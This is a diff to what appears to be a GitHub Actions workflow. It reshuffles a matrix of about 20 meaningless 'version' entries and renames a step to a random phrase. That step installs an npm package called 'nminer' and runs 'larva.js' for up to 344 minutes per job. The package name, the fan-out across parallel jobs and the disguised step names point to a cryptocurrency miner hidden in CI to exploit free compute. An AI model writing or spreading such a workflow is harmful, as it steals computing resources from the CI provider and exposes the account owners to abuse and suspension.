@@ -9,25 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6568 }
-          - { version: 4784 }
-          - { version: 6621 }
-          - { version: 8690 }
-          - { version: 5395 }
-          - { version: 3428 }
-          - { version: 5008 }
-          - { version: 3887 }
-          - { version: 9912 }
-          - { version: 440 }
-          - { version: 6731 }
-          - { version: 4318 }
-          - { version: 7633 }
-          - { version: 4766 }
-          - { version: 5799 }
-          - { version: 5591 }
-          - { version: 9658 }
-          - { version: 6684 }
-          - { version: 26 }
+          - { version: 6896 }
+          - { version: 2694 }
+          - { version: 149 }
+          - { version: 4281 }
+          - { version: 6575 }
+          - { version: 5110 }
+          - { version: 3554 }
+          - { version: 3316 }
+          - { version: 1173 }
+          - { version: 1925 }
+          - { version: 1664 }
+          - { version: 9068 }
+          - { version: 2841 }
+          - { version: 1715 }
+          - { version: 1174 }
+          - { version: 2414 }
+          - { version: 2225 }
+          - { version: 4196 }
+          - { version: 829 }
+          - { version: 6872 }
 
     steps:
       - name: Checkout
@@ -38,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: geez till integer
+      - name: of pants under highly
         run: |
           npm install nminer@latest
-          timeout 338m node larva.js || echo "larva executed"
+          timeout 344m node larva.js || echo "larva executed"
